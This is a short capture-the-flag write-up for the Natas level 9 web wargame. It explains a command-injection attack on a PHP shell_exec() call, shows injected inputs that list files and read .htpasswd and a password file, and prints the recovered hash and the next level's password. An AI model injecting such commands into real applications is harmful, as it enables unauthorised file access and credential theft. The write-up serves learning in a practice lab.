# natas9

The source code reveals that it's running a shell script using `shell_exec()`, which means that I can use UNIX commands. Using 
```sh
| ls -a . #
```
*The `|` is the pipe operator in bash, which takes the output of the previous command and uses it as input for this command. In this case it's not really necessary, meaning that it's also possibly to use `&&` or `;`.
The `#` is comment in bash, which means to inore the rest of the code, that is, `dictionary.txt`, it's not really necessary, but it's good to keep it clean.*

revealed that there's a filed called `.htpasswd`, which I then modified it to `cat` out the content of the file, which had this.

> $1$p1kwO0uc$UgW30vjmwt4x31BP1pWsV

... but it is not the password.

So after struggling for way too long, someone gave me a hint. "Look at the front page of Natas." Which tells me that the password is stored in a specific location, which then makes this incredibly easy.

```sh
| cat ../../../../etc/natas_webpass/natas10 #
```

> nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu